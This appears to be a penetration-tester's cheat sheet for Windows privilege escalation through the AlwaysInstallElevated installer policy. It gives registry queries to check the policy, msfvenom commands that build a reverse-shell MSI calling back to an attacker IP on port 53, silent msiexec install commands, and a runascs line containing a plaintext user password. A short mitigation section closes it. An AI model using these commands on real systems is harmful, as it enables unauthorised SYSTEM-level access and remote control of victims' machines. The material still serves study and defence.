## What is AlwaysInstallElevated?

AlwaysInstallElevated is a Windows Installer policy that, when set in both HKCU and HKLM to 0x1, allows .msi packages to be installed with SYSTEM privileges even by low-privileged users.

## How to ?
Query for AlwaysInstallElevated registry key
```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated  
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
Note: Both the current user and local machine hives must be 0x1 (Turned on)

Generate reverse shell for `.msi`
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<TARGET_IP> LPORT=<PORT> -f msi -o rev.msi
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.17.38.79 LPORT=53 -f msi -o rev.msi
```

Upload file and run the installer using msiexec
```
msiexec /quiet /qn /i <PATH_TO_.msi>
msiexec /quiet /qn /i C:\Users\dev-datasci-lowpriv\Downloads\rev.msi
```
`msiexec`: Windows Installer Command-line utility used for installing, modifying, or uninstalling MSI packages  
`/quiet`: Runs the installer with no user interface or prompts displayed  
`/qn`: Quiet mode with no user interface  
`/i`: install the specified package  

Case 1:
- `msiexec` not installing (No response)
- Available User credentials
Try `runasc`
```
PS C:\Users\dev-datasci-lowpriv\Downloads> invoke-runascs 'dev-datasci-lowpriv' 'wUqnKWqzha*W!PWrPRWi!M8faUn' "cmd /c msiexec /quiet /qn /i C:\Users\dev-datasci-lowpriv\Downloads\rev.msi"  
```

## Mitigation

- Disable Computer Configuration\Administrative Templates\Windows Components\Windows Installer
- Disable User Configuration\Administrative Templates\Windows Components\Windows Installer


